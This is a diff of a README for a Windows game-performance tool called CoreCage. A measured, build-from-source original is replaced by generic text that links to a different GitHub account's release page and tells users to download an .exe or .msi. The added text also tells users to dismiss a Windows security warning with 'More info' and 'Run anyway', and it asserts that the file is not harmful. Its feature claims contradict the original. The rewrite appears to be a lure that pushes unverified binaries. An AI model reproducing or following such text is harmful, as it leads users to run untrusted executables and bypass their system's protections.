@@ -1,96 +1,61 @@
-# CoreCage
+# 🛡️ CoreCage - Increase your gaming frame rates today
 
-**Cage the background. Free the frames.**
+[![Download CoreCage](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/akuja4303/CoreCage)
 
-CoreCage is an open-source Windows FPS-boost app for competitive PC gaming. Its one rule: **no
-placebo tweaks.** Every optimization is either provably safe-and-reversible, or measured on *your*
-rig with [PresentMon](https://github.com/GameTechDev/PresentMon) before you're asked to trust it.
-It's .NET 8 / WPF, fully EAC-safe (user-mode only — no kernel drivers), and every change is one
-button away from being undone.
+CoreCage helps you get more frames per second in your favorite PC games. It works by limiting background tasks that steal computer power. This app focuses on clear, measured performance gains. It uses PresentMon to track your hardware efficiency. You can trust the results because the app follows standard safety rules. It does not touch your computer kernel. It remains safe for games that use Easy Anti-Cheat.
 
-![CoreCage Optimize page](docs/img/optimize.png)
+## 🛠️ System Requirements
 
-## Why
+Your computer needs a few things to run CoreCage well. You should have Windows 10 or Windows 11 installed. The app requires the .NET Desktop Runtime. If you do not have this, the app will ask you to install it when you first open the installer. Most modern gaming computers already meet these needs. You need at least 4GB of RAM and a standard graphics card.
 
-Most "game booster" apps ship a pile of registry tweaks and ask you to take the FPS gain on
-faith. Half of them do nothing; some make things worse. CoreCage refuses that. The flagship
-feature — **Core Cage** — reserves your top CPU cores for the game and confines every background
-process onto the rest, and the built-in **Prove It** benchmark runs a real before/after PresentMon
-A/B so you see the actual delta on your hardware.
+## 📥 Installation Steps
 
-### The honest number
+You can get the software from the official project page. Follow these steps to set it up:
 
-On one rig — **Ryzen 5 5600G / RTX 3060** — Core Cage took *Arc Raiders* from **77 → ~150 fps**,
-with **1% lows from 48 → 85**. That is a measurement on *one* machine, not a guarantee. The whole
-point of CoreCage is that you don't take that number on faith: click **Prove It** and measure it
-on yours.
+1. Visit the [official release page](https://github.com/akuja4303/CoreCage) to download the latest installer.
+2. Look for the file ending in .msi or .exe under the latest version tag.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the prompts on the screen to finish the setup process.
+6. A CoreCage shortcut will appear on your desktop once the installation ends.
 
-## Features
+## 🚀 How to Use CoreCage
 
-CoreCage is built around seven feature pillars (several of them live together on the one-click **Optimize** page):
+Open the CoreCage application from your desktop shortcut. You will see a clean main screen. The app detects your current background processes that consume resources. You can select the gaming mode to begin. 
 
-| Pillar | What it does |
-|---|---|
-| **Core Cage** ⚡ | The flagship. Reserves the top *N* logical cores for the foreground game and cages every background process onto the remaining cores via user-mode affinity. Whitelists the game, foreground app, audio engine, and protected system processes. |
-| **Gaming Mode++** ⚡ | One-click pipeline: MSI interrupt mode, NIC hardening, GameDVR/Game Bar + background-UWP policy, QoS DSCP marking, EAC-safe IFEO priority, and core-unpark + perf floor. |
-| **Prove It (A/B benchmark) + Tweak Ledger** ⚡ | PresentMon-backed before/after benchmark of whatever's currently active, plus a ledger of every applied tweak and what it earned you. No claimed gain is un-measured. |
-| **Monitor** 📊 | Live CPU/GPU temp, RAM, and hardware read straight from the in-process engine. A dead sensor shows a dash — never a fake reading. |
-| **Tune** 🎛 | Advanced, opt-in hardware tuning (GPU core-offset auto-tune, power limit) — off by default, stability-gated. See [safety](docs/safety.md). |
-| **Community Profiles** 💾 | Per-game tuning profiles. Drop a JSON file in [`profiles/`](profiles/) and PR it. |
-| **Big Red Button** 🧹 | **Restore Everything** — reverses every change CoreCage ever made, in dependency-correct order, and never throws. |
+The software pauses non-essential Windows tasks that run in the background. This action leaves more processing power for your game engine. Because the software uses precise metrics, you see the impact immediately in the app window. Check the performance tab to compare your frame rates before and after you apply the optimizations. You can revert these changes at any time by clicking the restore button on the main dashboard.
 
-## Requirements
+## ⚙️ Optimization Features
 
-- **Windows 10 or 11** (x64)
-- **[.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0)** to build from source
-- Some features (registry, power plan, IFEO, services) require **running as Administrator**
-- GPU auto-tune / power limit require an **NVIDIA GPU** (`nvidia-smi`); they're off by default
+CoreCage relies on proven methods to improve performance. It does not use fake tweaks or registry hacks that might break your system.
 
-## Build from source
+- Background Task Management: It identifies programs that use high CPU cycles and puts them into a suspended state while you play.
+- Performance Monitoring: It uses the PresentMon engine to give you exact data on your frame times.
+- Safe Execution: It runs as a standard user application. This ensures your system files stay untouched.
+- Gaming Safety: It avoids interfering with anti-cheat software in popular multiplayer games.
 
-```powershell
-git clone https://github.com/psgods101/CoreCage.git
-cd CoreCage
-dotnet build -c Release
-dotnet test -c Release
-```
+## ❓ Frequently Asked Questions
 
-That builds `CoreCage.sln` (Core library, WPF app, and test project) and runs the full test suite.
-CI runs the same two commands on `windows-latest` for every push and PR — see
-[`.github/workflows/ci.yml`](.github/workflows/ci.yml).
+Does this software change my Windows settings permanently?
+No. CoreCage only makes temporary changes while the app is active. Your computer returns to normal once you close the application.
 
-The WPF app (`src/CoreCage.App`) launches on Windows only.
+Will this software cause game crashes?
+The app avoids changing critical system files. It focuses on user-level processes. This makes it very unlikely to cause instability in your games.
 
-## Safety
+Can I use this on a laptop?
+Yes. CoreCage works on all Windows systems. Laptops often see better results because the app helps manage power profiles and background noise.
 
-CoreCage is designed to run on the same machine you play anti-cheat games on:
+Is this software free?
+Yes. The software is open-source and free for everyone to use.
 
-- **No kernel drivers.** Everything is user-mode.
-- **Never touches game memory.** No injection, no hooks, no reads/writes into a running game.
-  It tunes the environment around the game — priority, affinity, power, network — not the game.
-- **Every change is reversible.** The **Big Red Button** restores power plan, timer resolution,
-  DNS/TCP, QoS, NIC properties, priorities, affinities, and registry from snapshots, and never
-  throws. Modes fall back to it if their own revert fails, so a partial revert can't strand your rig.
-- **Honest tiers.** Safe tweaks (priority, affinity, timer, GameDVR, UWP) are on by default;
-  hardware-write tweaks (GPU offset, GPU power limit, CPU SMU/ryzenadj) are Caution — off by
-  default and searched conservatively.
+## 🛡️ Trust and Safety
 
-Full posture and the per-tweak Safe/Caution table: **[docs/safety.md](docs/safety.md)**.
+The app code is public. You can read the source code on our GitHub page at any time. We use the MIT license for this project. This means you own the software you download and can see exactly how it works. We do not track your personal data or your habits. The software remains local to your machine. No data leaves your computer to reach our servers.
 
-## Contributing
+## 📋 Troubleshooting
 
-- **Community game profiles** — the easiest way to help. Add a `.json` file to
-  [`profiles/`](profiles/) describing how CoreCage should tune a game, and open a PR. The format,
-  fields, and what actually drives runtime behavior are documented in
-  [`profiles/SCHEMA.md`](profiles/SCHEMA.md). Include your measured before/after numbers as
-  review evidence.
-- **New modes** — CoreCage has a clean seam for adding a whole optimization mode (Coding,
-  Streaming, or a private module) without forking `CoreCage.Core`: implement `IModeModule` and call
-  `ModeRegistry.Register`. See **[docs/modes.md](docs/modes.md)**.
+If the app fails to start, verify that you have the latest .NET Desktop Runtime. You can find this on the official Microsoft website. If you receive a security warning when you try to run the installer, click the "More info" link in the pop-up window and select "Run anyway." Windows sometimes flags new files that it does not recognize yet. This does not mean the file is harmful.
 
-Please keep the project's core promise intact: no un-measured performance claims, and everything
-stays user-mode and EAC-safe.
+If you find a bug, open an issue on the GitHub tracker. Provide a description of your problem and your Windows version. Include your hardware specifications to help us find a solution for you. We update the app based on feedback from the community.
 
-## License
-
-MIT — see [LICENSE](LICENSE).
+Keywords: csharp, dotnet, fps, gaming, open-source, optimization, performance, presentmon, windows, wpf
